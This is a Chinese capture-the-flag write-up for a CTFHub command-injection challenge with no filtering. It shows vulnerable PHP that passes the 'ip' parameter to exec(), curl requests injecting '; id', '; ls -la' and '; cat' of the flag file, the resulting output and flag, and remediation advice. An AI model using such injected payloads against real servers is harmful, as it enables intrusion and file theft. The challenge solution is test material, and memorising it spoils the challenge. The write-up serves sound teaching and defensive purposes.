CTFHub - Web - 命令注入-无过滤

# CTFHub # Web # RCE # 命令注入 # PHP

一、题目信息

  • 题目名称：命令注入-无过滤
  • 题目方向：Web - RCE
  • 运行环境：PHP
  • 题目目标：利用 ping 参数直接拼接系统命令的漏洞，读取服务器上的 Flag。

二、漏洞分析

题目首页通过 show_source(__FILE__) 暴露了后端源码，核心逻辑如下：

<?php
$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);
}
?>

$_GET['ip'] 未经过滤或转义，直接被拼接到系统命令中。分号 ;、逻辑与 &&、管道 |、反引号等都可用于截断或扩展原命令，从而执行任意 Shell 命令。页面使用 exec($cmd, $res) 收集输出，并最终通过 print_r($res) 回显，因此命令执行结果可以直接看到。

三、解题步骤

  1. 验证命令执行：在 ip 参数中追加 id 命令。 
    curl.exe -sS --get ^
  --data-urlencode "ip=127.0.0.1; id" ^
  "http://<challenge-host>:10800/"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
  2. 查看 Web 目录：使用 pwd 和 ls -la 定位当前目录及文件。 
    curl.exe -sS --get ^
  --data-urlencode "ip=127.0.0.1; pwd; ls -la" ^
  "http://<challenge-host>:10800/"
    /var/www/html
total 20
drwxr-xr-x    1 www-data www-data      4096 Sep 23 11:11 .
drwxr-xr-x    1 root     root          4096 Jan 30  2020 ..
-rw-r--r--    1 root     root            42 Sep 23 11:11 192103211919946.php
-rw-r--r--    1 root     root           536 Feb 20  2020 index.php

    文件名由题目环境生成，实际解题时以 ls 的结果为准。

  3. 读取 Flag 文件：使用 cat 读取生成的 PHP 文件。 
    curl.exe -sS --get ^
  --data-urlencode "ip=127.0.0.1; cat /var/www/html/192103211919946.php" ^
  "http://<challenge-host>:10800/"
    <?php // ctfhub{fc5e30715115786b377d09e1}

四、最终 Flag

ctfhub{fc5e30715115786b377d09e1}

五、修复建议

  • 严格校验 IP：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验输入，只允许合法 IP 地址。
  • 避免拼接 Shell 命令：优先使用参数分离的命令执行方式；如果无法避免，必须对参数使用 escapeshellarg() 处理。
  • 遵循最小权限：限制 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
  • 收敛源码信息：不要在业务页面通过 show_source() 或 highlight_file() 暴露后端源码。
